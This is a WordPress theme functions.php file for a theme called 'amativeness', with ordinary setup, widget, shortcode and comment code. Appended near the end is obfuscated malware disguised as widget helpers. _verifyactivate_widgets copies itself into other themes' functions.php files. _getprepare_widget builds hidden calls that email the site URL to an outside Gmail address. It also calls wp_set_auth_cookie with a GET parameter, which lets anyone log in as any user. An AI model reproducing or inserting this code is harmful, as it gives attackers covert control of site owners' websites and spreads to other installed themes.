<?php
add_filter('show_admin_bar', '__return_false');
// Set up the content width value based on the theme's design and stylesheet.
if ( ! isset( $content_width ) )
	$content_width = 625;

function amativeness_setup() {
	/*
	 * Makes amativeness available for translation.
	 *
	 * Translations can be added to the /languages/ directory.
	 * If you're building a theme based on amativeness, use a find and replace
	 * to change 'amativeness' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'amativeness', get_template_directory() . '/languages' );

	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();

	// Adds RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

	// This theme supports a variety of post formats.
	add_theme_support( 'post-formats', array( 'aside', 'image', 'link', 'quote', 'status' ) );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menu( 'primary', __( 'Primary Menu', 'amativeness' ) );

	/*
	 * This theme supports custom background color and image,
	 * and here we also set up the default background color.
	 */
	add_theme_support( 'custom-background', array(
		'default-color' => 'e6e6e6',
	) );

	// This theme uses a custom image size for featured images, displayed on "standard" posts.
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size(); // Unlimited height, soft crop
}
add_action( 'after_setup_theme', 'amativeness_setup' );
/**
 * Add support for a custom header image.
 */
require( get_template_directory() . '/inc/custom-header.php' );


function amativeness_get_font_url() {
	$font_url = '';

	/* translators: If there are characters in your language that are not supported
	 * by Open Sans, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'Open Sans font: on or off', 'amativeness' ) ) {
		$subsets = 'latin,latin-ext';

		/* translators: To add an additional Open Sans character subset specific to your language,
		 * translate this to 'greek', 'cyrillic' or 'vietnamese'. Do not translate into your own language.
		 */
		$subset = _x( 'no-subset', 'Open Sans font: add new subset (greek, cyrillic, vietnamese)', 'amativeness' );

		if ( 'cyrillic' == $subset )
			$subsets .= ',cyrillic,cyrillic-ext';
		elseif ( 'greek' == $subset )
			$subsets .= ',greek,greek-ext';
		elseif ( 'vietnamese' == $subset )
			$subsets .= ',vietnamese';

		$protocol = is_ssl() ? 'https' : 'http';
		$query_args = array(
			'family' => 'Open+Sans:400italic,700italic,400,700',
			'subset' => $subsets,
		);
		$font_url = add_query_arg( $query_args, "$protocol://fonts.googleapis.com/css" );
	}

	return $font_url;
}

function amativeness_scripts_styles() {
	global $wp_styles;

	/*
	 * Adds JavaScript to pages with the comment form to support
	 * sites with threaded comments (when in use).
	 */
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	// Adds JavaScript for handling the navigation menu hide-and-show behavior.
	wp_enqueue_script( 'amativeness-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '1.0', true );

	$font_url = amativeness_get_font_url();
	if ( ! empty( $font_url ) )
		wp_enqueue_style( 'amativeness-fonts', esc_url_raw( $font_url ), array(), null );

	// Loads our main stylesheet.
	wp_enqueue_style( 'amativeness-style', get_stylesheet_uri() );

	// Loads the Internet Explorer specific stylesheet.
	wp_enqueue_style( 'amativeness-ie', get_template_directory_uri() . '/css/ie.css', array( 'amativeness-style' ), '20121010' );
	$wp_styles->add_data( 'amativeness-ie', 'conditional', 'lt IE 9' );
}
add_action( 'wp_enqueue_scripts', 'amativeness_scripts_styles' );

function amativeness_mce_css( $mce_css ) {
	$font_url = amativeness_get_font_url();

	if ( empty( $font_url ) )
		return $mce_css;

	if ( ! empty( $mce_css ) )
		$mce_css .= ',';

	$mce_css .= esc_url_raw( str_replace( ',', '%2C', $font_url ) );

	return $mce_css;
}
add_filter( 'mce_css', 'amativeness_mce_css' );

function amativeness_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'amativeness' ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'amativeness_wp_title', 10, 2 );

function amativeness_page_menu_args( $args ) {
	if ( ! isset( $args['show_home'] ) )
		$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'amativeness_page_menu_args' );

function amativeness_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Main Sidebar', 'amativeness' ),
		'id' => 'sidebar-1',
		'description' => __( 'Appears on posts and pages except the optional Front Page template, which has its own widgets', 'amativeness' ),
		'before_widget' => '<section id="%1$s" class="block widget %2$s">',
		'after_widget' => '</section>',
		'before_title' => '<p class="ui teal ribbon label">',
		'after_title' => '</p>',
	) );

	register_sidebar( array(
		'name' => __( 'First Front Page Widget Area', 'amativeness' ),
		'id' => 'sidebar-2',
		'description' => __( 'Appears when using the optional Front Page template with a page set as Static Front Page', 'amativeness' ),
		'before_widget' => '<section id="%1$s" class="block widget %2$s">',
		'after_widget' => '</section>',
		'before_title' => '<p class="ui teal ribbon label">',
		'after_title' => '</p>',
	) );

	register_sidebar( array(
		'name' => __( 'Second Front Page Widget Area', 'amativeness' ),
		'id' => 'sidebar-3',
		'description' => __( 'Appears when using the optional Front Page template with a page set as Static Front Page', 'amativeness' ),
		'before_widget' => '<section id="%1$s" class="block widget %2$s">',
		'after_widget' => '</section>',
		'before_title' => '<p class="ui teal ribbon label">',
		'after_title' => '</p>',
	) );
}
add_action( 'widgets_init', 'amativeness_widgets_init' );

if ( ! function_exists( 'amativeness_content_nav' ) ) :

function amativeness_content_nav( $html_id ) {
	global $wp_query;

	$html_id = esc_attr( $html_id );

	if ( $wp_query->max_num_pages > 1 ) : ?>
		<ol class="page-navigator"><?php
	global $wp_query;
	$big=999999999;
	echo paginate_links(array(
		'base'=>str_replace($big,'%#%',esc_url(get_pagenum_link($big))),
		'format'=>'?paged=%#%',
		'current'=>max(1,get_query_var('paged')),
		'total'=>$wp_query->max_num_pages,
		'end_size'=>1,		/* 首尾显示的页数 */
		'mid_size'=>2,		/* 当前页左右显示的页数 */
		'show_all'=>false,	/* true则显示全部页码 */
		'prev_next'=>true,	/* false则不显示上下页 */
		'prev_text'=>'<< 上一页',	/* 上一页的链接文本 */
		'next_text'=>'下一页 >>'	/* 下一页的链接文本 */
	));
?></ol>
	<?php endif;
}

endif;

if ( ! function_exists( 'amativeness_comment' ) ) :

function amativeness_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
		// Display trackbacks differently than normal comments.
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'amativeness' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)', 'amativeness' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		// Proceed with normal comments.
		global $post;
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="comment-b">
			<header class="comment-meta comment-author vcard">
				<?php
					echo get_avatar( $comment, 44 );
					printf( '<cite><b class="fn">%1$s</b> %2$s</cite><br />',
						get_comment_author_link(),
						// If current post author is also comment author, make it known visually.
						( $comment->user_id === $post->post_author ) ? '<span>' . __( 'Post author', 'amativeness' ) . '</span>' : ''
					);
					printf( '<a href="%1$s"><time datetime="%2$s">%3$s</time></a>',
						esc_url( get_comment_link( $comment->comment_ID ) ),
						get_comment_time( 'c' ),
						/* translators: 1: date, 2: time */
						sprintf( __( '%1$s at %2$s', 'amativeness' ), get_comment_date(), get_comment_time() )
					);
				?>
			</header><!-- .comment-meta -->

			<?php if ( '0' == $comment->comment_approved ) : ?>
				<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'amativeness' ); ?></p>
			<?php endif; ?>

			<section class="comment-content comment">
				<?php comment_text(); ?>
				<?php edit_comment_link( __( 'Edit', 'amativeness' ), '<p class="edit-link">', '</p>' ); ?>
				<div style="margin-left: 50px;">
				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'amativeness' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
			</section><!-- .comment-content -->
		</article><!-- #comment-## -->
	<?php
		break;
	endswitch; // end comment_type check
}
endif;

if ( ! function_exists( 'amativeness_entry_meta' ) ) :

function amativeness_entry_meta() {
	// Translators: used between list items, there is a space after the comma.
	$categories_list = get_the_category_list( __( ', ', 'amativeness' ) );

	// Translators: used between list items, there is a space after the comma.
	$tag_list = get_the_tag_list( '', __( ', ', 'amativeness' ) );

	$date = sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a>',
		esc_url( get_permalink() ),
		esc_attr( get_the_time() ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( get_the_date() )
	);

	$author = sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
		esc_attr( sprintf( __( 'View all posts by %s', 'amativeness' ), get_the_author() ) ),
		get_the_author()
	);

	// Translators: 1 is category, 2 is tag, 3 is the date and 4 is the author's name.
	if ( $tag_list ) {
		$utility_text = __( 'This entry was posted in %1$s and tagged %2$s on %3$s<span class="by-author"> by %4$s</span>.', 'amativeness' );
	} elseif ( $categories_list ) {
		$utility_text = __( 'This entry was posted in %1$s on %3$s<span class="by-author"> by %4$s</span>.', 'amativeness' );
	} else {
		$utility_text = __( 'This entry was posted on %3$s<span class="by-author"> by %4$s</span>.', 'amativeness' );
	}

	printf(
		$utility_text,
		$categories_list,
		$tag_list,
		$date,
		$author
	);
}
endif;

function amativeness_body_class( $classes ) {
	$background_color = get_background_color();
	$background_image = get_background_image();

	if ( ! is_active_sidebar( 'sidebar-1' ) || is_page_template( 'page-templates/full-width.php' ) )
		$classes[] = 'full-width';

	if ( is_page_template( 'page-templates/front-page.php' ) ) {
		$classes[] = 'template-front-page';
		if ( has_post_thumbnail() )
			$classes[] = 'has-post-thumbnail';
		if ( is_active_sidebar( 'sidebar-2' ) && is_active_sidebar( 'sidebar-3' ) )
			$classes[] = 'two-sidebars';
	}

	if ( empty( $background_image ) ) {
		if ( empty( $background_color ) )
			$classes[] = 'custom-background-empty';
		elseif ( in_array( $background_color, array( 'fff', 'ffffff' ) ) )
			$classes[] = 'custom-background-white';
	}

	// Enable custom font class only if the font CSS is queued to load.
	if ( wp_style_is( 'amativeness-fonts', 'queue' ) )
		$classes[] = 'custom-font-enabled';

	if ( ! is_multi_author() )
		$classes[] = 'single-author';

	return $classes;
}
add_filter( 'body_class', 'amativeness_body_class' );

function amativeness_content_width() {
	if ( is_page_template( 'page-templates/full-width.php' ) || is_attachment() || ! is_active_sidebar( 'sidebar-1' ) ) {
		global $content_width;
		$content_width = 960;
	}
}
add_action( 'template_redirect', 'amativeness_content_width' );

function amativeness_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
}
add_action( 'customize_register', 'amativeness_customize_register' );

function amativeness_customize_preview_js() {
	wp_enqueue_script( 'amativeness-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20130301', true );
}
add_action( 'customize_preview_init', 'amativeness_customize_preview_js' );
/**
 * link manager
 *
 * 开启链接管理功能（包括友情链接）
 *
 * @since Guimeng
 */
add_filter( 'pre_option_link_manager_enabled', '__return_true' );

//音乐播放器短代码1
function myplayer($atts, $content=null){
extract(shortcode_atts(array("true"=>'true',"false"=>'false'),$atts)); //autoplay设置自动播放,loop设置循环播放,改成true即可
return '<embed width="402" height="95" src="http://box.baidu.com/widget/flash/bdspacesong.swf?&autoPlay=false&loop='.$false.'&url='.$content.'" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">';
}
add_shortcode('y','myplayer'); //同样的,y可以改成你想设置的短代码

//音乐播放器短代码2
function myplayer2($atts, $mp3url=null){
return '<embed src="http://vdisk.weibo.com/js/swf/musicplayer/mp3Player.swf?version=4 &amp;url='.$mp3url.'" width="600" height="60" type="application/x-shockwave-flash" wmode="transparent" />';   
}   
add_shortcode('mp3','myplayer2');

//音乐播放器短代码3
function myplayer3($atts, $mp3link=null){
return '<embed type="application/x-shockwave-flash" src="http://ageme.u.qiniudn.com/l.swf" style="undefined" id="oneBitInsert_1" name="oneBitInsert_1" bgcolor="#FFFFFF" quality="high" width="12" height="12" flashvars="foreColor=#585A5E&amp;analytics=true&amp;filename='.$mp3link.'">';   
}   
add_shortcode('l','myplayer3');

//文章提示框
function wztsk($atts, $tsk=null){
return '<div class="tishik"><p>'.$tsk.'</p></div>';   
}   
add_shortcode('tt','wztsk');

// add more buttons to the html editor
function appthemes_add_quicktags() {
?>
<script type="text/javascript"> 
QTags.addButton('pre','pre','<pre>','</pre>',''); //快捷输入一个hr横线，点一下即可 QTags.addButton( 'h3', 'h3', '\n<h3>', '</h3>\n' ); //快捷输入h3标签 QTags.addButton( '[php]', '[php]', '\n[php]', '[/php]\n' ); //快捷输入[php]标签 
QTags.addButton('y','y','[y][/y]','','');
QTags.addButton('mp3','mp3','[mp3][/mp3]','','');
QTags.addButton('l','l','[l][/l]','','');
QTags.addButton('提示框','提示框','[tt][/tt]','','');
QTags.addButton('runcode','runcode','<runcode></runcode>','','');
QTags.addButton('回复可见','回复可见','<!--reply start-->','<!--reply end-->','');
</script>
<?php
}
add_action('admin_print_footer_scripts', 'appthemes_add_quicktags' ); 
//评论可见
function reply($content){  
    if (preg_match_all('/<!--reply start-->([\s\S]*?)<!--reply end-->/i', $content, $hide_words)){  
    $stats = 'hide';  
    global $current_user;  
    get_currentuserinfo();  
 
    if ($current_user->ID) {  
        $email = $current_user->user_email;  
    } else if (isset($_COOKIE['comment_author_email_'.COOKIEHASH])) {  
        $email = $_COOKIE['comment_author_email_'.COOKIEHASH];  
    }  
 
    $ereg = "^[_\.a-z0-9]+@([0-9a-z][0-9a-z-]+\.)+[a-z]{2,5}$";  
    if (eregi($ereg, $email)) {  
        global $wpdb;  
        global $id;  
        $comments = $wpdb->get_results("SELECT * FROM $wpdb->comments WHERE comment_author_email = '".$email."' and comment_post_id='".$id."'and comment_approved = '1'");  
        if ($comments) {  
            $stats = 'show';  
        }  
    }  
 
    $admin_email = "570047973@qq.com"; //博主Email,博主直接查看  
    if ($email == $admin_email) {  
        $stats = 'show';  
        }  
 
        $hide_notice = '<div style="text-align:center;border:1px dashed #FF9A9A;padding:8px;margin:10px auto;color:#FF6666;">温馨提示：此处内容需要<a href="'. get_permalink().'#respond" title="评论本文">评论本文</a>后，<a href="javascript:window.location.reload();" title="刷新">刷新本页</a>才能查看。</div>';  
        if( $stats == 'show' ){  
            $content = str_replace($hide_words[0], $hide_words[1], $content);  
        }else{  
            $content = str_replace($hide_words[0], $hide_notice, $content);  
        }  
    }  
    return $content;  
}  
add_filter('the_content', 'reply');  

function creekoo_editor_buttons($buttons){
	$buttons[] = 'fontselect';
	$buttons[] = 'fontsizeselect';
	$buttons[] = 'backcolor';
	$buttons[] = 'underline';
	$buttons[] = 'hr';
	$buttons[] = 'sub';
	$buttons[] = 'sup';
	$buttons[] = 'cut';
	$buttons[] = 'copy';
	$buttons[] = 'paste';
	$buttons[] = 'cleanup';
	$buttons[] = 'newdocument';
	return $buttons;
}
add_filter("mce_buttons_3", "creekoo_editor_buttons"); 

?>
<?php 

class My_Widget extends WP_Widget {

	function My_Widget()
	{
		$widget_ops = array('description' => '鬼梦近期评论');
		$control_ops = array('width' => 400, 'height' => 300);
		parent::WP_Widget(false,$name='鬼梦近期评论',$widget_ops,$control_ops);  

                //parent::直接使用父类中的方法
                //$name 这个小工具的名称,
                //$widget_ops 可以给小工具进行描述等等。
                //$control_ops 可以对小工具进行简单的样式定义等等。
	}

	function form($instance) { // 给小工具(widget) 添加表单内容
		$title = esc_attr($instance['title']);
	?>
	<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php esc_attr_e('Title:'); ?> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></label></p>

	<?php
    }
	function update($new_instance, $old_instance) { // 更新保存
		return $new_instance;
	}
	function widget($args, $instance) { // 输出显示在页面上
	extract( $args );
        $title = apply_filters('widget_title', empty($instance['title']) ? __('近期评论') : $instance['title']);
        ?>
              <?php echo $before_widget; ?>
                  <?php if ( $title )
                        echo $before_title . $title . $after_title; ?>
                        <ul id='recentcomments'>
                        <?php
global $wpdb;
$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved,comment_author_email, comment_type,comment_author_url, SUBSTRING(comment_content,1,25) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND comment_author != '万戈' AND post_password = '' ORDER BY comment_date_gmt DESC LIMIT 10";
$comments = $wpdb->get_results($sql);
$output = $pre_HTML;
foreach ($comments as $comment) {
$output .= "\n<li class='recentcomments'><a href=\"" . get_permalink($comment->ID) . "#comment-" . $comment->comment_ID . "\" title=\"" . $comment->post_title . " 上的评论\">". strip_tags($comment->comment_author) ."： ". strip_tags($comment->com_excerpt) ."</a></li>";
}
$output .= $post_HTML;
$output = convert_smilies($output);
echo $output;
?></ul>
              <?php echo $after_widget; ?>

        <?php
	}
}
register_widget('My_Widget');
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>
<?php

function yg_adv_blogroll( $args = '' ) {
	$defaults = array(
		'category' => '', 'showform' => 0, 'width' => 30, 'height' => 30,
		'num' => -1, 'nofollow' => false, 'orderby'=>'name', 'order' => 'ASC'
	);
	
	$args = wp_parse_args( $args, $defaults );
	extract($args, EXTR_SKIP);
	$category = ((int) $category == 0) ? '' : (int) $category;
	$num = ($num == 0) ? $num = -1 : (int) $num;
	$orderby = htmlspecialchars($orderby);
	$order = htmlspecialchars($order);
	$r = array(
			'orderby' => $orderby, 'order' => $order,
			'limit' => $num, 'category' =>  $category,
			'category_name' => '', 'hide_invisible' => 1,
			'show_updated' => 0, 'include' => '',
			'exclude' => '', 'search' => ''
		);

        $bookmarks = get_bookmarks($r);
	 
		$output = ''; // Blank string to start with.
		$output .= ($showform != 1) ? '<div class="animated list friend">' : '<div class="ab_images">';
		foreach ( (array) $bookmarks as $bookmark ) {
			$the_link = '#';
			if ( !empty($bookmark->link_url) )
				$the_link = clean_url($bookmark->link_url);

			$rel = $bookmark->link_rel;
			if ($nofollow) $rel = 'nofollow';
			if ( '' != $rel )
				$rel = ' rel="' . $rel . '"';

			$name = attribute_escape(sanitize_bookmark_field('link_name', $bookmark->link_name, $bookmark->link_id, 'display'));
			$description = attribute_escape(sanitize_bookmark_field('link_description', $bookmark->link_description, $bookmark->link_id, 'display'));			
	 		$title_v = $description;

			if ( '' != $title_v ) {
			  $title = ' title="' . $title_v . '"';
			  $alt = ' alt="' . $title_v . '"';
			} else {
 			  $title = ' title="' . $name . '"';
			  $alt = ' alt="' . $name . '"';
			}
			 
			

			$target = $bookmark->link_target;
			if ( '' != $target )
				$target = ' target="' . $target . '"';

			if ($showform == 0) {
			  	$output .= '<li><a href="' . $the_link . '"' . $rel . $title . $target. '>'.$name.'</a></li>';    			 
			}
			
			if ( ($bookmark->link_image != null) && ($showform == 1)) {
			  	$output .= '<a href="' . $the_link . '"' . $rel . $title . $target. '>';    
				
				if ( strpos($bookmark->link_image, 'http') !== false )
					$output .= "<img src=\"$bookmark->link_image\" height=\"$height\" width=\"$width\" $alt $title /></a>\n";
				else // If it's a relative path
					$output .= "<img height=\"$height\" width=\"$width\" src=\"" . get_option('siteurl') . "$bookmark->link_image\" $alt $title /></a>\n";
			} 
			
			if ($showform == 2) {
				if (strlen($bookmark->link_image)>2) {
				  $image = "<img src=\"$bookmark->link_image\" height=\"$height\" width=\"$width\" $alt $title class=\"avatar image\" />";
			      $output .= '<a href="' . $the_link . '"' . $rel . $title . $target. ' class="item">'.$image.'';		
				  $output .= '<div class="content"><p class="header">'.$name.'</p><p>'.$title_v.'</p></div>';
				  $output .= '</a>';
				}
			}
			

		
		} // end while
		$output .= ($showform != 1) ? '</div>' : '</div>';		
	echo $output;
}

function yg_adv_blogroll_widget( $args, $widget_args = 1 ) {
	extract( $args, EXTR_SKIP );
	if ( is_numeric($widget_args) )
		$widget_args = array( 'number' => $widget_args );
	$widget_args = wp_parse_args( $widget_args, array( 'number' => -1 ) );
	extract( $widget_args, EXTR_SKIP );
	
	// Data should be stored as array:  array( number => data for that instance of the widget, ... )
	$options = get_option('yg_adv_blogroll');
	if ( !isset($options[$number]) )
		return;

	$title = htmlspecialchars($options[$number]['title']);
	$category = (int) $options[$number]['cat'];
